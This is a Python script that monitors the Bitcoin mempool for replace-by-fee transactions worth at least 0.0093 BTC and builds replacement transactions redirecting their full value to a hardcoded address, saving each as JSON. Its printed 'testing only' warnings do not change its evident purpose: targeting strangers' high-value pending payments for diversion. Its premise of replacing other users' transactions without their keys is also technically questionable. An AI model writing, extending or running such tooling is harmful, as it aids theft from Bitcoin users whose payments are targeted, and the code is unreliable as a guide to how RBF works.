#!/usr/bin/env python3
"""
Targeted Replacer - Automatically replace transactions with 0.0093 BTC or higher
"""

import time
import json
import logging
from typing import Dict, Optional, Set
from auto_replacer import AutoReplacer
import requests

class TargetedReplacer(AutoReplacer):
    """Automatically replace RBF transactions with value >= 0.0093 BTC"""
    
    def __init__(self, target_address: str, replacement_strategy: str = 'moderate'):
        super().__init__(target_address, replacement_strategy)
        self.min_btc_threshold = 0.0093  # Minimum BTC value to target
        self.min_satoshi_threshold = int(self.min_btc_threshold * 100000000)  # Convert to satoshis
        
    def meets_value_threshold(self, tx_data: Dict) -> bool:
        """Check if transaction value meets the minimum threshold"""
        total_output_value = 0
        for output in tx_data.get('vout', []):
            total_output_value += output.get('value', 0)
        
        return total_output_value >= self.min_satoshi_threshold
    
    def process_rbf_transaction(self, txid: str) -> bool:
        """Process a single RBF transaction for replacement if it meets value threshold"""
        if txid in self.processed_txids:
            return False
        
        self.processed_txids.add(txid)
        
        # Fetch transaction details
        tx_data = self.get_transaction_details(txid)
        if not tx_data:
            return False
        
        # Check if transaction meets value threshold
        if not self.meets_value_threshold(tx_data):
            total_value_btc = sum(output.get('value', 0) for output in tx_data.get('vout', [])) / 100000000
            print(f"⏭️  Skipping {txid[:16]}... ({total_value_btc:.8f} BTC < {self.min_btc_threshold} BTC threshold)")
            return False
        
        # Create replacement
        replacement = self.create_replacement_to_address(tx_data)
        if not replacement:
            return False
        
        # Save replacement data
        filename = f"target_replacement_{txid[:16]}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(replacement, f, indent=2)
        
        # Display results
        self.display_targeted_replacement(replacement, filename)
        self.replacement_count += 1
        
        return True
    
    def display_targeted_replacement(self, replacement: Dict, filename: str):
        """Display targeted replacement creation results"""
        original_value_btc = replacement['total_value_redirected'] / 100000000
        print("\n" + "="*70)
        print("🎯 HIGH-VALUE RBF REPLACEMENT CREATED")
        print("="*70)
        print(f"Original TxID: {replacement['original_txid'][:20]}...")
        print(f"Target Address: {replacement['target_address']}")
        print(f"Original Value: {original_value_btc:.8f} BTC ({replacement['total_value_redirected']:,} sat)")
        print(f"Strategy: {replacement['strategy_used']['name'].upper()}")
        print(f"Fee Increase: +{replacement['fee_increase']} sat")
        print(f"New Fee Rate: {replacement['strategy_used']['new_fee_rate']:.2f} sat/vB")
        print(f"Saved to: {filename}")
        print("="*70)
        print("⚠️  WARNING: Replacement created but NOT signed or broadcast")
        print("⚠️  This demonstrates replacement creation for testing only")
        print()
    
    def monitor_high_value_transactions(self, duration_minutes: int = 60):
        """Monitor mempool for high-value RBF transactions and create replacements"""
        if not self.validate_target_address():
            print(f"❌ Invalid target address: {self.target_address}")
            return
        
        print(f"🎯 Starting Targeted Auto-Replacer")
        print(f"Target Address: {self.target_address}")
        print(f"Value Threshold: {self.min_btc_threshold} BTC ({self.min_satoshi_threshold:,} sat)")
        print(f"Strategy: {self.replacement_strategy}")
        print(f"Duration: {duration_minutes} minutes")
        print("="*70)
        
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        
        # Get initial mempool state
        known_txids = set()
        
        while time.time() < end_time:
            try:
                # Fetch current mempool
                url = f"{self.config.get_api_url()}/mempool/txids"
                response = self.session.get(url, timeout=self.config.REQUEST_TIMEOUT)
                
                if response.status_code == 200:
                    current_txids = set(response.json())
                    new_txids = current_txids - known_txids
                    
                    # Process new transactions
                    processed_count = 0
                    for txid in new_txids:
                        if processed_count >= 50:  # Limit processing to avoid overload
                            break
                            
                        # Quick check if it's RBF
                        tx_data = self.get_transaction_details(txid)
                        if tx_data and self._is_rbf_transaction(tx_data):
                            if self.meets_value_threshold(tx_data):
                                total_value_btc = sum(output.get('value', 0) for output in tx_data.get('vout', [])) / 100000000
                                print(f"🎯 Found high-value RBF: {txid[:16]}... ({total_value_btc:.8f} BTC)")
                                self.process_rbf_transaction(txid)
                        
                        processed_count += 1
                    
                    known_txids = current_txids
                    
                    # Show status
                    elapsed = int((time.time() - start_time) / 60)
                    remaining = duration_minutes - elapsed
                    print(f"⏱️  Running: {elapsed}m elapsed, {remaining}m remaining, {self.replacement_count} high-value replacements created")
                
            except Exception as e:
                self.logger.error(f"Error in monitoring cycle: {e}")
            
            time.sleep(15)  # Check every 15 seconds for high-value targets
        
        print(f"\n✅ Targeted Auto-Replacer completed: {self.replacement_count} high-value replacements created")

def main():
    """Main entry point for targeted replacer"""
    import sys
    
    target_address = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9"
    strategy = sys.argv[1] if len(sys.argv) > 1 else 'moderate'
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    
    print(f"🎯 Targeted RBF Replacer")
    print(f"Targeting transactions >= 0.0093 BTC")
    print(f"Redirecting to: {target_address}")
    print()
    
    replacer = TargetedReplacer(target_address, strategy)
    replacer.monitor_high_value_transactions(duration)

if __name__ == "__main__":
    main()